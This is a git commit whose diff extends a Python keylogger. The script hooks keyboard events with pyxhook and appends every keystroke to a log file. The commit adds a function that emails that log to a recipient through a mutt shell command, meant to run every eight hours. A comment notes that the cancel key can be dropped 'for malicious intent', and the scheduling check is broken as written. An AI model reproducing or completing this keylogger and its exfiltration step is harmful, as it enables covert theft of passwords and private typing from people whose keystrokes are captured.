22de9c0ac8850a4090c8c1af92a9d2d88e8d0b76
Jeremy Tabujara <jemy_T20@hotmail.com>
2020-12-01 18:32:11 -0800

    Emailing added
    Last commit forgot to add the keylogger.py update
    
    Still untested

--- Keylogger.py
+++ Keylogger.py
@@ -1,8 +1,13 @@
 import os
 import pyxhook
 import datetime
+
+pathName = '/home/file.log'
+emailRecipient = "recipient@domain.com"
+
 #log file save location
-log_file = os.environ.get('psylogger_file',os.path.expanduser('~/Desktop/file.log'))
+log_file = os.environ.get('psylogger_file',pathName)
+
 
 #cancel key for the keylogger, may be removed for malicious intent
 cancel_key = ord(os.environ.get( 'pylogger_cancel',  '`')[0] )
@@ -18,6 +23,11 @@ def OnKeyPress(event):
     with open(log_file, 'a') as f:
         f.write('{} : {}\n'.format(datetime.datetime.now(), event.Key))
 
+def mailLog():
+    os.system("echo 'This is the message body' | mutt -a '{}' -s 'subject of message' -- {}".format(pathName,emailRecipient))
+
+
+
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress
 
@@ -25,6 +35,7 @@ new_hook.HookKeyboard()
 try:
     new_hook.start()         # start the hook
 except KeyboardInterrupt:
+    # User cancelled from command line.
     pass
 except Exception as ex:
     # Write exceptions to the log file, for analysis later.
@@ -33,6 +44,7 @@ except Exception as ex:
     with open(log_file, 'a') as f:
         f.write('\n{}'.format(msg))
 
-
-
+#send email every 8 hours
+if (datetime.datetime.hour%8 ==0 ):
+    mailLog()
 
